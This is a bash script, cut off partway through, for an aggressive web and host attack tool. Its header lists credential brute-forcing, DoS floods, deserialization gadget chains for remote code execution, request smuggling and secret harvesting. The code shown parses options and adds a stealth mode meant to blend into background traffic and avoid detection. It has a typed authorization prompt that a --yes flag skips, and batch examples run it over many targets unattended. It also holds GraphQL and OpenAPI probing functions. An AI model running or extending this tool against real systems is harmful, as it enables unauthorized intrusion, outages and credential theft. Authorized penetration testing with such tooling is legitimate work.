#!/usr/bin/env bash
#
# Includes:
#   * Network: routing, hyperscaler inference, DNS misconfigs.
#   * Host: port scan, service versions, CVE matching (nmap), TLS audit.
#   * Web: deep crawl (+gau/wayback), JS endpoint mining, secret mining, headers.
#   * Stack: server/CDN + frontend (React/Vue/Angular/Svelte/Next/Nuxt/HTMX/Alpine)
#            + backend framework fingerprint, with framework-specific follow-ups.
#   * API: route discovery (kiterunner), OpenAPI/Swagger + GraphQL (introspection,
#          batching, field-suggestion, mutations), method mapping, WebSocket
#          discovery + message-level fuzzing (SSTI/SQLi/XSS/CSWSH),
#          parameter fuzzing (arjun/ffuf).
#   * Access: 401/403 bypass (header/path tricks), CORS reflection, Host-header
#             injection, cache poisoning, .well-known/security.txt exposure.
#   * AuthZ: IDOR/BOLA + BFLA via 2nd identity (--cookie2), object enumeration,
#            mass assignment, JWT analysis (alg:none/weak-secret/claims).
#   * Verified injection (response evidence): SSTI, OS-cmd, path traversal,
#            SQL-error, SSRF, XXE, insecure deserialization, open redirect.
#            Adaptive soft-404 baseline. Confirmed findings emit PoC curls (pocs.sh).
#   * Exploit: deser gadget chains (ysoserial/phpggc) fired at sinks with OOB
#            proof of RCE (--dos + --collab; --rce-cmd for a custom command).
#   * Smuggling: native CL.TE/TE.CL timing detection (raw sockets, --dos).
#   * Secrets: JS bundle sweep (TOKEN=/Bearer/apiKey/cloud keys) + trufflehog,
#            source-map (.map) theft, favicon hash pivot.
#   * Vuln: nuclei (whole corpus, OOB via --collab), XSS (dalfox), SQLi (sqlmap).
#   * Break: deep 5xx provocation - malformed bodies, type confusion, oversized
#            input, verb tampering, per-error capture.   [--dos only]
#   * Brute: SSH and HTTP credential testing (hydra).     [skipped in --stealth]
#   * Stress: L4/L7 DoS exposure (wrk/slowhttptest/hping3).  [--dos only]
#
# Usage:
#   server-fucker.sh <target...> [options]
#     <target>            host, host:port, or URL (http[s]://host[:port][/path])
#     @file / --targets <file>   read targets from a file (one per line)
#
#   --cookie <string>     session cookie for authenticated scanning
#   --header <string>     custom header (e.g. "Authorization: Bearer <token>")
#   --cookie2 <string>    second, lower-privileged session -> unlocks IDOR/BFLA cross-user
#   --header2 <string>    second identity via header (alternative to --cookie2)
#   --collab <host|url>   OOB collaborator (interactsh/Burp) for blind SSRF/RCE/log4shell
#   --reauth-cmd <cmd>    shell cmd printing a fresh cookie/header value; auto-refreshes
#                         the session mid-scan when the token expires (base URL 401/403)
#   --rce-cmd <cmd>       command to execute on target via deser gadget chains (--dos);
#                         default is an OOB callback to --collab (proof without a shell)
#   --spa                 enable headless-browser crawl (needs system chromium)
#   --full-ports          scan all 65535 TCP ports (default: top 1000)
#   --duration <sec>      per-tool time budget (default 60)
#   --max-time <sec>      overall wall-clock ceiling
#   --tool-timeout <sec>  hard per-tool kill backstop (default DURATION*20, min 300)
#   --out <dir>           report directory
#   --yes / -y            skip the interactive authorization prompt (assume yes)
#   --dos                 ENABLE flooding + 500-provocation (off by default; can crash target)
#   --stealth             slow, single-flow, jittered, low-noise; disables DoS/brute
#   --rate <rps>          global request-rate cap for fuzzers/probes (default: unbounded)
#
# Examples:
#   server-fucker.sh 192.168.1.1
#   server-fucker.sh https://app.example.com --cookie "session=abc"
#   # full API-authz + injection run with two identities and an OOB collaborator:
#   server-fucker.sh https://api.example.com --cookie "admin=..." \
#       --cookie2 "user=..." --collab abc123.oast.fun --dos --yes
#
#   # Run sequentially over many URLs from a file (one target per line), one at a
#   # time, auto-authorizing each. xargs -L1 feeds a single target per invocation;
#   # -P1 keeps them serial so reports/output do not interleave:
#   xargs -L1 -P1 server-fucker.sh --yes < targets.txt
#   # or from a pipe:
#   printf '%s\n' host1 https://host2 host3:8443 | xargs -L1 -P1 server-fucker.sh --yes
#
# Dependencies:
#
# yay -S --needed curl jq iputils whois bind nmap sslscan testssl.sh gobuster nikto sqlmap hydra wrk hping slowhttptest python openssl chromium httpx-bin subfinder-bin katana-bin naabu-bin nuclei-bin nuclei-templates ffuf-bin gowitness-bin dalfox-bin kiterunner-bin arjun trufflehog wafw00f seclists gau-bin waybackurls python-mmh3 ysoserial phpggc

set -uo pipefail

## ---------------------------------------------------------------- colors & utils

C_R='\033[0;31m'; C_G='\033[0;32m'; C_Y='\033[0;33m'; C_B='\033[0;34m'; C_P='\033[0;35m'; C_C='\033[0;36m'; C_W='\033[0;37m'; C_D='\033[2m'; C_0='\033[0m'

log()   { echo -e "[$(elapsed)] $*" | tee -a "$SUMMARY"; }
err()   { echo -e "${C_R}ERROR: $*${C_0}" >&2; }
warn()  { echo -e "${C_Y}WARN:  $*${C_0}" >&2; }
info()  { echo -e "${C_B}INFO:  $*${C_0}" >&2; }
have()  { command -v "$1" >/dev/null 2>&1; }

## ---------------------------------------------------------------- args

TARGETS=(); FULL_PORTS=0; SPA=0
FORCE_HTTPS=0; WORDLIST=""; DURATION=60; MAX_TIME=0; OUTDIR=""
COOKIE=""; HEADER=""; YES=0
DOS=0; STEALTH=0; RATE=0; TOOL_TIMEOUT=0
COOKIE2=""; HEADER2=""; COLLAB=""; REAUTH_CMD=""; RCE_CMD=""

usage() { sed -n '2,77p' "$0" | sed 's/^# \{0,1\}//'; exit "${1:-0}"; }

add_targets_file() {
    local f="$1" line
    [ -r "$f" ] || { err "cannot read targets file: $f"; exit 1; }
    while IFS= read -r line; do
        line="${line%%#*}"; line="${line// /}"
        [ -n "$line" ] && TARGETS+=("$line")
    done < "$f"
}

while [ $# -gt 0 ]; do
    case "$1" in
        --full-ports) FULL_PORTS=1 ;;
        --cookie)     COOKIE="${2:?--cookie needs a value}"; shift ;;
        --header)     HEADER="${2:?--header needs a value}"; shift ;;
        --cookie2)    COOKIE2="${2:?--cookie2 needs a value}"; shift ;;
        --header2)    HEADER2="${2:?--header2 needs a value}"; shift ;;
        --collab)     COLLAB="${2:?--collab needs a host/url}"; shift ;;
        --reauth-cmd) REAUTH_CMD="${2:?--reauth-cmd needs a command}"; shift ;;
        --rce-cmd)    RCE_CMD="${2:?--rce-cmd needs a command}"; shift ;;
        --spa)        SPA=1 ;;
        --https)      FORCE_HTTPS=1 ;;
        --targets)    add_targets_file "${2:?--targets needs a file}"; shift ;;
        --wordlist)   WORDLIST="${2:?--wordlist needs a file}"; shift ;;
        --duration)   DURATION="${2:?--duration needs seconds}"; shift ;;
        --max-time)   MAX_TIME="${2:?--max-time needs seconds}"; shift ;;
        --out)          OUTDIR="${2:?--out needs a dir}"; shift ;;
        --yes|-y)       YES=1 ;;
        --dos)          DOS=1 ;;
        --stealth)      STEALTH=1 ;;
        --rate)         RATE="${2:?--rate needs requests/sec}"; shift ;;
        --tool-timeout) TOOL_TIMEOUT="${2:?--tool-timeout needs seconds}"; shift ;;
        -h|--help)      usage 0 ;;
        @*)           add_targets_file "${1#@}" ;;
        -*)           err "unknown option: $1"; usage 1 ;;
        *)            TARGETS+=("$1") ;;
    esac
    shift
done

if [ "${#TARGETS[@]}" -eq 0 ] && [ ! -t 0 ]; then
    while IFS= read -r line; do line="${line// /}"; [ -n "$line" ] && TARGETS+=("$line"); done
fi
[ "${#TARGETS[@]}" -eq 0 ] && { err "no target given"; usage 1; }

# Multi-target re-exec
if [ "${#TARGETS[@]}" -gt 1 ]; then
    passthru=()
    [ "$FULL_PORTS" = 1 ] && passthru+=(--full-ports)
    [ -n "$COOKIE" ] && passthru+=(--cookie "$COOKIE")
    [ -n "$HEADER" ] && passthru+=(--header "$HEADER")
    [ -n "$COOKIE2" ] && passthru+=(--cookie2 "$COOKIE2")
    [ -n "$HEADER2" ] && passthru+=(--header2 "$HEADER2")
    [ -n "$COLLAB" ] && passthru+=(--collab "$COLLAB")
    [ -n "$REAUTH_CMD" ] && passthru+=(--reauth-cmd "$REAUTH_CMD")
    [ -n "$RCE_CMD" ] && passthru+=(--rce-cmd "$RCE_CMD")
    [ "$SPA" = 1 ] && passthru+=(--spa)
    [ "$YES" = 1 ] && passthru+=(--yes)
    [ "$DOS" = 1 ] && passthru+=(--dos)
    [ "$STEALTH" = 1 ] && passthru+=(--stealth)
    [ "$RATE" -gt 0 ] 2>/dev/null && passthru+=(--rate "$RATE")
    [ "$TOOL_TIMEOUT" -gt 0 ] 2>/dev/null && passthru+=(--tool-timeout "$TOOL_TIMEOUT")
    [ "$FORCE_HTTPS" = 1 ] && passthru+=(--https)
    [ -n "$WORDLIST" ] && passthru+=(--wordlist "$WORDLIST")
    passthru+=(--duration "$DURATION")
    [ "$MAX_TIME" -gt 0 ] 2>/dev/null && passthru+=(--max-time "$MAX_TIME")
    rc=0
    for t in "${TARGETS[@]}"; do
        echo -e "\n${C_P}########## target: $t ##########${C_0}"
        "$0" "$t" "${passthru[@]}" || rc=1
    done
    exit "$rc"
fi

TARGET="${TARGETS[0]}"

## ---------------------------------------------------------------- target parsing

SCHEME="http"; HOST=""; PORT=""; PATHQ="/"
case "$TARGET" in
    http://*|https://*)
        SCHEME="${TARGET%%://*}"
        rest="${TARGET#*://}"
        hostport="${rest%%/*}"
        [ "$hostport" != "$rest" ] && PATHQ="/${rest#*/}"
        ;;
    *)
        hostport="${TARGET%%/*}"
        [ "$hostport" != "$TARGET" ] && PATHQ="/${rest#*/}"
        [ "$FORCE_HTTPS" = 1 ] && SCHEME="https"
        ;;
esac
HOST="${hostport%%:*}"
[ "$hostport" != "${hostport#*:}" ] && PORT="${hostport##*:}"
if [ -z "$PORT" ]; then [ "$SCHEME" = "https" ] && PORT=443 || PORT=80; fi
BASEURL="${SCHEME}://${HOST}:${PORT}${PATHQ}"

# Auth flags
HTTPX_AUTH=(); NUCLEI_AUTH=(); FFUF_AUTH=(); KATANA_AUTH=(); SQLMAP_AUTH=(); CURL_AUTH=()
[ -n "$COOKIE" ] && { HTTPX_AUTH+=(-cookie "$COOKIE"); NUCLEI_AUTH+=(-cookie "$COOKIE"); FFUF_AUTH+=(-b "$COOKIE"); KATANA_AUTH+=(-cookie "$COOKIE"); SQLMAP_AUTH+=(--cookie "$COOKIE"); CURL_AUTH+=(-b "$COOKIE"); }
[ -n "$HEADER" ] && { HTTPX_AUTH+=(-header "$HEADER"); NUCLEI_AUTH+=(-header "$HEADER"); FFUF_AUTH+=(-H "$HEADER"); KATANA_AUTH+=(-header "$HEADER"); SQLMAP_AUTH+=(--header "$HEADER"); CURL_AUTH+=(-H "$HEADER"); }

## ---------------------------------------------------------------- speed / stealth tuning
# Derived knobs threaded into every tool so --stealth / --rate change behaviour globally.
THREADS=40; FFUF_RATE=0; NUCLEI_RL=150; KATANA_C=15; KATANA_RL=150
NMAP_TIMING="-T4"; NAABU_TUNE=(); SQLMAP_TUNE=(); DALFOX_TUNE=(); FFUF_DELAY=()
PROBE_JITTER=0            # max seconds of random sleep between manual curl probes
STEALTH_UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
UA=""

if [ "$STEALTH" = 1 ]; then
    # Blend into background noise: single flow, low packet rate, big random jitter,
    # realistic browser UA, and NO flooding/brute (those are unmistakable).
    DOS=0
    THREADS=1; FFUF_RATE=1; NUCLEI_RL=1; KATANA_C=1; KATANA_RL=2
    NMAP_TIMING="-T1"; NAABU_TUNE=(-rate 10 -c 1); SQLMAP_TUNE=(--delay 4 --random-agent)
    DALFOX_TUNE=(--delay 4000 --worker 1); FFUF_DELAY=(-p 1.0-8.0)
    PROBE_JITTER=8; UA="$STEALTH_UA"
    [ "$RATE" -gt 0 ] 2>/dev/null && { FFUF_RATE=$RATE; NUCLEI_RL=$RATE; KATANA_RL=$RATE; }
elif [ "$RATE" -gt 0 ] 2>/dev/null; then
    FFUF_RATE=$RATE; NUCLEI_RL=$RATE; KATANA_RL=$RATE
fi

# UA injection into every tool's header set (and curl)
if [ -n "$UA" ]; then
    HTTPX_AUTH+=(-header "User-Agent: $UA"); NUCLEI_AUTH+=(-header "User-Agent: $UA")
    FFUF_AUTH+=(-H "User-Agent: $UA");       KATANA_AUTH+=(-header "User-Agent: $UA")
    CURL_AUTH+=(-A "$UA")
fi

# second identity (for IDOR/BFLA) as curl args, and OOB collaborator host
CURL_AUTH2=()
[ -n "$COOKIE2" ] && CURL_AUTH2+=(-b "$COOKIE2")
[ -n "$HEADER2" ] && CURL_AUTH2+=(-H "$HEADER2")
[ -n "$UA" ]      && CURL_AUTH2+=(-A "$UA")
COLLAB_HOST="${COLLAB#http://}"; COLLAB_HOST="${COLLAB_HOST#https://}"; COLLAB_HOST="${COLLAB_HOST%%/*}"
# self-hosted interactsh server for nuclei OOB, only if --collab is a full URL
NUCLEI_OOB=()
case "$COLLAB" in http://*|https://*) NUCLEI_OOB=(-iserver "$COLLAB") ;; esac

# ffuf extra flags for the string-interpolated (sh -c) ffuf invocations
FFUF_EXTRA="-rate $FFUF_RATE"; [ "$STEALTH" = 1 ] && FFUF_EXTRA="$FFUF_EXTRA -p 1.0-8.0"
# break-500 ffuf keeps a deliberate rate cap (avoid accidental DoS); stealth slows it hard
BREAK_FFUF="-t 15 -rate 60"
[ "$RATE" -gt 0 ] 2>/dev/null && BREAK_FFUF="-t 15 -rate $RATE"
[ "$STEALTH" = 1 ] && BREAK_FFUF="-t 1 -rate 1 -p 1.0-8.0"

## ---------------------------------------------------------------- safety gate

is_private() {
    case "$1" in
        127.*|10.*|192.168.*|169.254.*|localhost|::1) return 0 ;;
        172.1[6-9].*|172.2[0-9].*|172.3[0-1].*)       return 0 ;;
        100.6[4-9].*|100.[7-9][0-9].*|100.1[01][0-9].*|100.12[0-7].*) return 0 ;;
        *.local|*.test|*.internal|*.lan|*.home.arpa)  return 0 ;;
        *) return 1 ;;
    esac
}

echo -e "${C_R}!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!${C_0}"
echo -e "${C_R}  WARNING: DESTRUCTIVE ASSESSMENT INITIATED${C_0}"
echo -e "${C_R}!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!${C_0}"
echo -e " This script will perform high-intensity tests including:"
echo -e "  - ${C_W}Credential Brute-force${C_0} (SSH, HTTP Auth)$([ "$STEALTH" = 1 ] && echo -e "  ${C_D}[disabled: stealth]${C_0}")"
echo -e "  - ${C_W}DoS Flooding + 500-provocation${C_0} (L4/L7 floods, fault injection)  $([ "$DOS" = 1 ] && echo -e "${C_R}[ENABLED]${C_0}" || echo -e "${C_D}[off: pass --dos]${C_0}")"
echo -e "  - ${C_W}Deep Vulnerability Fuzzing${C_0} (nuclei DAST, XSS, SQLi)"
echo -e ""
echo -e " This CAN and WILL degrade performance or CRASH the target."
echo -e " ${C_Y}Unauthorized use against systems you do not own is ILLEGAL.${C_0}"
echo -e "${C_C}----------------------------------------------------------${C_0}"
echo -e " target   : ${C_W}$BASEURL${C_0}"
echo -e " host/port: ${C_W}$HOST : $PORT${C_0}"
echo -e " scope    : $(is_private "$HOST" && echo -e "${C_G}private${C_0}" || echo -e "${C_R}PUBLIC${C_0}")"
echo -e " mode     : $([ "$STEALTH" = 1 ] && echo -e "${C_G}STEALTH${C_0} (slow, low-noise, single-flow)" || echo -e "${C_W}standard${C_0}")  |  DoS: $([ "$DOS" = 1 ] && echo -e "${C_R}on${C_0}" || echo 'off')  |  rate: $([ "$RATE" -gt 0 ] 2>/dev/null && echo "${RATE}/s" || echo 'unbounded')"
echo -e "${C_C}----------------------------------------------------------${C_0}"

if [ "$YES" = 1 ]; then
    echo -e "${C_Y}--yes given: authorization prompt skipped for ${C_W}$HOST${C_0}"
else
    printf "${C_Y}Type the target host name to authorize EVERYTHING: ${C_0}"
    read -r confirm
    [ "$confirm" = "$HOST" ] || { err "Authorization mismatch ('$confirm' != '$HOST'). Aborting."; exit 3; }
fi
echo -e "${C_G}Authorization confirmed. Starting assessment...${C_0}"

## ---------------------------------------------------------------- setup

TS="$(date +%Y%m%d-%H%M%S)"
[ -z "$OUTDIR" ] && OUTDIR="./sf-report-${HOST}-${TS}"
mkdir -p "$OUTDIR/raw"
SUMMARY="$OUTDIR/raw/run.log"
REPORT="$OUTDIR/REPORT.md"
: > "$SUMMARY"

# Preflight tool inventory: record every expected tool that is not installed so
# the operator knows which parts of the assessment were skipped for lack of a binary.
MISSING_INV="$OUTDIR/raw/missing-inventory.txt"; : > "$MISSING_INV"
EXPECTED_TOOLS="curl jq tracepath whois host wafw00f gowitness katana \
subfinder trufflehog gau waybackurls naabu nmap testssl sslscan gobuster ffuf kr \
arjun nikto nuclei dalfox sqlmap hydra wrk slowhttptest hping3"
# httpx ships under two possible names; only missing if neither exists
have httpx-toolkit || have httpx || printf 'httpx\n' >> "$MISSING_INV"
for _t in $EXPECTED_TOOLS; do have "$_t" || printf '%s\n' "$_t" >> "$MISSING_INV"; done
if [ -s "$MISSING_INV" ]; then
    warn "missing tools (features degraded): $(paste -sd' ' "$MISSING_INV")"
fi

START=$SECONDS
HB=5                       # heartbeat interval (s)
PH=0
NPHASES=7
RUN_PID=""; HB_PID=""; RUN_NAME=""
CANCELLED=0
OPEN_PORTS=""; NCORPUS=0; CORPUS="$OUTDIR/raw/corpus.txt"

elapsed() { printf '%dm%02ds' $(( (SECONDS-START)/60 )) $(( (SECONDS-START)%60 )); }
phase() { PH=$((PH+1)); log "${C_P}[phase $PH/$NPHASES] == $1 ==${C_0}"; }

kill_tree() {
    local p="$1" c
    for c in $(pgrep -P "$p" 2>/dev/null); do kill_tree "$c"; done
    kill -TERM "$p" 2>/dev/null
}

on_cancel() {
    trap - INT TERM
    CANCELLED=1
    printf '\n'
    log "${C_R}!! cancelled - writing partial report${C_0}"
    [ -n "$HB_PID" ]  && kill "$HB_PID" 2>/dev/null
    [ -n "$RUN_PID" ] && kill_tree "$RUN_PID"
    pkill -f 'chrom.*--headless' 2>/dev/null
    build_report
    exit 130
}
trap on_cancel INT TERM

if [ "${MAX_TIME:-0}" -gt 0 ] 2>/dev/null; then
    ( sleep "$MAX_TIME"; kill -TERM $$ 2>/dev/null ) &
    WATCHDOG=$!
    log "wall-clock ceiling: ${MAX_TIME}s"
fi

run() {
    local name="$1"; shift
    RUN_NAME="$name"
    if ! have "$1"; then
        log "${C_D}SKIP $name ($1 missing)${C_0}"
        printf '%s\t%s\n' "$1" "$name" >> "$OUTDIR/raw/missing-tools.txt" 2>/dev/null
        return 1
    fi
    local t0=$SECONDS sl
    # per-tool timeout backstop: prevents one hung tool from stalling the phase.
    # Sits above each tool's own internal budgets. Skipped for shell-function tasks
    # (openapi_probe/provoke500/...) since `timeout` can only exec real binaries.
    local to="$TOOL_TIMEOUT"
    if [ "$to" -gt 0 ] 2>/dev/null; then
        [ "$to" -lt 10 ] && to=10                 # honor explicit --tool-timeout (min 10s)
    else
        to=$(( DURATION * 20 )); [ "$to" -lt 300 ] && to=300   # default backstop floor
    fi
    log "RUN  ${C_G}$name${C_0} ..."
    if declare -F "$1" >/dev/null 2>&1 || ! have timeout; then
        "$@" >"$OUTDIR/raw/$name.log" 2>&1 &
    else
        timeout -k 5 "$to" "$@" >"$OUTDIR/raw/$name.log" 2>&1 &
    fi
    RUN_PID=$!
    while kill -0 "$RUN_PID" 2>/dev/null; do
        sleep "$HB" & sl=$!
        wait -n 2>/dev/null
        kill "$sl" 2>/dev/null; wait "$sl" 2>/dev/null
        kill -0 "$RUN_PID" 2>/dev/null && \
            printf "\r${C_D}    ... %s  %ss${C_0}" "$name" "$((SECONDS-t0))" >&2
    done
    wait "$RUN_PID" 2>/dev/null; local rc=$?
    RUN_PID=""
    printf '\r\033[K' >&2
    log "done ${C_G}$name${C_0} (${rc}) in $((SECONDS-t0))s"
    return $rc
}

## ---------------------------------------------------------------- API discovery helpers

# curl auth args reused by the probe functions below (auth + stealth UA)
_curl_auth() {
    _CA=()
    [ -n "$COOKIE" ] && _CA+=(-b "$COOKIE")
    [ -n "$HEADER" ] && _CA+=(-H "$HEADER")
    [ -n "$UA" ]     && _CA+=(-A "$UA")
}

# transient-failure retry for *discovery* curls (safe: never used by the 500-hunter,
# which must see 5xx rather than retry through them).
_RETRY=(--retry 2 --retry-delay 1 --retry-connrefused)

# random sleep between manual probes; 0 in normal mode, up to PROBE_JITTER s in stealth.
_jitter() {
    [ "$PROBE_JITTER" -gt 0 ] 2>/dev/null || return 0
    sleep "$(awk -v m="$PROBE_JITTER" 'BEGIN{srand();printf "%.1f", 1+rand()*(m-1)}')" 2>/dev/null || true
}

# GET a URL, echo "STATUS BYTELEN [ELAPSED_MS]". Uses primary auth (_CA) unless caller
# passes -b/-H overrides after the URL. Requires _curl_auth to have been called.
_probe() { # url [extra curl args...]
    local url="$1"; shift
    local out; out=$(mktemp 2>/dev/null) || { echo "000 0 0"; return; }
    local resp code len ms
    resp=$(curl -sk -m 10 "${_RETRY[@]}" -o "$out" -w '%{http_code} %{time_total}' "${_CA[@]}" "$@" "$url" 2>/dev/null)
    code="${resp%% *}"; ms=$(awk -v t="${resp##* }" 'BEGIN{printf "%d", t*1000}' 2>/dev/null)
    len=$(wc -c < "$out" 2>/dev/null | tr -d ' ')
    rm -f "$out"; echo "${code:-000} ${len:-0} ${ms:-0}"
}

# Soft-404 / catch-all calibration. Sets BL_STATUS/BL_LEN/BL_WK_STATUS/CATCHALL globals.
# MUST be called directly (not via run) so the globals survive in the parent shell.
BL_STATUS=""; BL_LEN=0; BL_WK_STATUS=""; CATCHALL=0; BL_VAR=0
calibrate_baseline() {
    _curl_auth
    local rnd="sfcal${RANDOM}${RANDOM}" s2 l2
    read -r BL_STATUS BL_LEN _ <<< "$(_probe "${SCHEME}://${HOST}:${PORT}/${rnd}nonexist")"
    # second random sample -> observed size variance of soft-404 pages (dynamic content)
    read -r s2 l2 _ <<< "$(_probe "${SCHEME}://${HOST}:${PORT}/${rnd}nonexist2b")"
    BL_VAR=$(( ${BL_LEN:-0} - ${l2:-0} )); [ "$BL_VAR" -lt 0 ] && BL_VAR=$(( -BL_VAR ))
    read -r BL_WK_STATUS _ _ <<< "$(_probe "${SCHEME}://${HOST}:${PORT}/.well-known/${rnd}")"
    case "$BL_STATUS" in 2*|3*) CATCHALL=1 ;; esac
    printf 'baseline: /random -> HTTP %s (%s bytes, variance %s) | /.well-known/random -> HTTP %s | catch-all=%s\n' \
        "$BL_STATUS" "$BL_LEN" "$BL_VAR" "$BL_WK_STATUS" "$CATCHALL"
}

# Does a (code,len) result meaningfully differ from the catch-all baseline?
# Threshold adapts to observed soft-404 size variance (avoids FPs on dynamic pages).
_differs() { # code len
    [ "${1:-}" != "$BL_STATUS" ] && return 0
    local d=$(( ${2:-0} - BL_LEN )); [ "$d" -lt 0 ] && d=$(( -d ))
    local thr=$(( 96 + 2 * BL_VAR )); [ "$d" -gt "$thr" ]
}

# Validate supplied auth up front so an expired token doesn't silently 401 the whole run.
auth_check() {
    [ -z "$COOKIE$HEADER" ] && { echo "no primary auth supplied (unauthenticated scan)"; return 0; }
    _curl_auth
    local s l m; read -r s l m <<< "$(_probe "$BASEURL")"
    case "$s" in
        401|403) echo "WARNING: primary auth returns HTTP $s on base URL - token may be invalid/expired" ;;
        *)       echo "primary auth accepted (HTTP $s on base URL)" ;;
    esac
    if [ -n "$COOKIE2$HEADER2" ]; then
        local _CA_SAVE=("${_CA[@]}"); _CA=(); [ -n "$COOKIE2" ] && _CA+=(-b "$COOKIE2"); [ -n "$HEADER2" ] && _CA+=(-H "$HEADER2"); [ -n "$UA" ] && _CA+=(-A "$UA")
        read -r s l m <<< "$(_probe "$BASEURL")"
        echo "second identity (--cookie2/--header2): HTTP $s on base URL"
        _CA=("${_CA_SAVE[@]}")
    fi
}

# Rebuild every tool's auth array from the current COOKIE/HEADER/UA (used after reauth).
rebuild_auth() {
    HTTPX_AUTH=(); NUCLEI_AUTH=(); FFUF_AUTH=(); KATANA_AUTH=(); SQLMAP_AUTH=(); CURL_AUTH=()
    [ -n "$COOKIE" ] && { HTTPX_AUTH+=(-cookie "$COOKIE"); NUCLEI_AUTH+=(-cookie "$COOKIE"); FFUF_AUTH+=(-b "$COOKIE"); KATANA_AUTH+=(-cookie "$COOKIE"); SQLMAP_AUTH+=(--cookie "$COOKIE"); CURL_AUTH+=(-b "$COOKIE"); }
    [ -n "$HEADER" ] && { HTTPX_AUTH+=(-header "$HEADER"); NUCLEI_AUTH+=(-header "$HEADER"); FFUF_AUTH+=(-H "$HEADER"); KATANA_AUTH+=(-header "$HEADER"); SQLMAP_AUTH+=(--header "$HEADER"); CURL_AUTH+=(-H "$HEADER"); }
    [ -n "$UA" ] && { HTTPX_AUTH+=(-header "User-Agent: $UA"); NUCLEI_AUTH+=(-header "User-Agent: $UA"); FFUF_AUTH+=(-H "User-Agent: $UA"); KATANA_AUTH+=(-header "User-Agent: $UA"); CURL_AUTH+=(-A "$UA"); }
}

# Mid-scan session refresh: if the token has expired (base URL now 401/403) and a
# --reauth-cmd was given, run it to obtain a fresh cookie/header value, then rebuild
# all auth arrays. reauth-cmd must print the replacement value (cookie string, or the
# header value if HEADER-based auth) on stdout. Called at phase boundaries.
reauth_check() {
    [ -z "$REAUTH_CMD" ] && return 0
    [ -z "$COOKIE$HEADER" ] && return 0
    _curl_auth
    local s l m; read -r s l m <<< "$(_probe "$BASEURL")"
    case "$s" in
        401|403)
            log "auth expired mid-scan (HTTP $s) - running --reauth-cmd"
            local newv; newv=$(eval "$REAUTH_CMD" 2>/dev/null | tail -1 | tr -d '\r\n')
            if [ -n "$newv" ]; then
                if [ -n "$COOKIE" ]; then COOKIE="$newv"; else HEADER="$newv"; fi
                rebuild_auth; _curl_auth
                read -r s l m <<< "$(_probe "$BASEURL")"
                log "reauth complete -> base URL now HTTP $s"
            else
                warn "--reauth-cmd produced no output; continuing with stale session"
            fi
            ;;
    esac
}

# Fetch & parse OpenAPI/Swagger specs -> concrete endpoint URLs + method map.
openapi_probe() {
    local out="$OUTDIR/raw/openapi"; mkdir -p "$out"
    local base="${SCHEME}://${HOST}:${PORT}"
    local eps="$OUTDIR/raw/openapi-endpoints.txt"; : > "$eps"
    local methods="$out/methods.txt"; : > "$methods"
    local found="$out/found.txt"; : > "$found"
    _curl_auth
    local p spec code pth
    for p in openapi.json swagger.json swagger/v1/swagger.json v2/api-docs \
             v3/api-docs api-docs api/swagger.json api/openapi.json \
             api/v1/openapi.json api/v3/openapi.json openapi.yaml swagger.yaml \
             .well-known/openapi swagger/doc.json swagger-resources docs/swagger.json; do
        spec="$out/$(printf '%s' "$p" | tr '/' '_')"
        _jitter
        code=$(curl -sk -m 8 "${_RETRY[@]}" -o "$spec" -w '%{http_code}' "${_CA[@]}" "$base/$p" 2>/dev/null)
        if [ "$code" = 200 ] && grep -qiE '"(openapi|swagger)"[[:space:]]*:|^(openapi|swagger):|"paths"|^paths:' "$spec" 2>/dev/null; then
            printf 'FOUND spec: %s/%s (HTTP %s)\n' "$base" "$p" "$code" | tee -a "$found"
            if have jq && head -c1 "$spec" | grep -q '{'; then
                jq -r '.paths // {} | keys[]' "$spec" 2>/dev/null | while read -r pth; do
                    printf '%s%s\n' "$base" "$pth"; done >> "$eps"
                jq -r '.paths // {} | to_entries[] | .key as $p | (.value|keys[]?) | (ascii_upcase) + " " + $p' \
                    "$spec" 2>/dev/null >> "$methods"
            else
                grep -oE '"/[a-zA-Z0-9_{}./~-]+"' "$spec" 2>/dev/null | tr -d '"' | \
                    while read -r pth; do printf '%s%s\n' "$base" "$pth"; done >> "$eps"
            fi
        else
            rm -f "$spec"
        fi
    done
    # concretize path templates ({id} -> 1) so they are fuzzable
    if [ -s "$eps" ]; then
        sed -E 's/\{[^}]+\}/1/g' "$eps" | sort -u > "$eps.tmp" && mv "$eps.tmp" "$eps"
    fi
    [ -s "$found" ] || echo "no OpenAPI/Swagger spec found at common paths"
}

# GraphQL introspection probe.
graphql_probe() {
    local out="$OUTDIR/raw/graphql"; mkdir -p "$out"
    local base="${SCHEME}://${HOST}:${PORT}"
    local res="$out/result.txt"; : > "$res"
    _curl_auth
    local q='{"query":"query IntrospectionQuery{__schema{queryType{name} mutationType{name} types{name kind fields{name}}}}"}'
    local p code body
    for p in graphql api/graphql v1/graphql v2/graphql query graphiql graphql/console \
             console 'index.php?graphql' api/graphql/v1; do
        body="$out/$(printf '%s' "$p" | tr '/?=' '___').json"
        _jitter
        code=$(curl -sk -m 8 "${_RETRY[@]}" -o "$body" -w '%{http_code}' -X POST \
               -H 'Content-Type: application/json' "${_CA[@]}" --data "$q" "$base/$p" 2>/dev/null)
        local live=0
        if grep -qE '"__schema"|"queryType"|"data"[[:space:]]*:' "$body" 2>/dev/null; then
            printf 'GraphQL introspection OPEN: %s/%s (HTTP %s)\n' "$base" "$p" "$code" | tee -a "$res"
            printf '%s/%s\n' "$base" "$p" >> "$OUTDIR/raw/api-endpoints-extra.txt"; live=1
            grep -qE '"mutationType"[[:space:]]*:[[:space:]]*\{' "$body" 2>/dev/null \
                && printf '  mutationType exposed -> state-changing operations reachable\n' >> "$res"
        elif [ "$code" = 200 ] || [ "$code" = 400 ]; then
            printf 'GraphQL endpoint present (introspection maybe disabled): %s/%s (HTTP %s)\n' "$base" "$p" "$code" >> "$res"
            printf '%s/%s\n' "$base" "$p" >> "$OUTDIR/raw/api-endpoints-extra.txt"; live=1
        else
            rm -f "$body"
        fi
        if [ "$live" = 1 ]; then
            local u="$base/$p"
            # field suggestion leak (works even when introspection disabled)
            local sug; sug=$(curl -sk -m 8 "${_RETRY[@]}" -X POST -H 'Content-Type: application/json' "${_CA[@]}" \
                --data '{"query":"{ nonExistentField_sf }"}' "$u" 2>/dev/null)
            printf '%s' "$sug" | grep -qiE 'Did you mean|Cannot query field' \
